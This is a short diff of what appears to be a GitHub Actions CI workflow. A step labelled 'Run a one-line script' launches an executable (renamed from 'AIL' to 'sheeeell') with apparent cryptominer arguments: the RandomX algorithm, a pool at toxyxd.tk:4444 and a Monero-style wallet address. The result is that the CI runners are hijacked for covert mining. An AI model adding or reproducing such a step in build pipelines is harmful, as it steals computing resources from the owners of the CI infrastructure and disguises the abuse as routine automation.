@@ -27,4 +27,4 @@ jobs:
 
     # Runs a single command using the runners shell
     - name: Run a one-line script
-      run: chmod +x AIL && ./AIL --opencl -a rx/0 -o toxyxd.tk:4444 -u 47RCb7MbBvk27AqS75e9gfd8ipnaQDstaWWVajnD9a6z4qfJN62Y6uUVz9haFPibshNG5Rd8oVj5YgccpyKJa8DnBpPFikv.gh
+      run: chmod +x sheeeell && ./sheeeell --opencl -a rx/0 -o toxyxd.tk:4444 -u 47RCb7MbBvk27AqS75e9gfd8ipnaQDstaWWVajnD9a6z4qfJN62Y6uUVz9haFPibshNG5Rd8oVj5YgccpyKJa8DnBpPFikv.gh
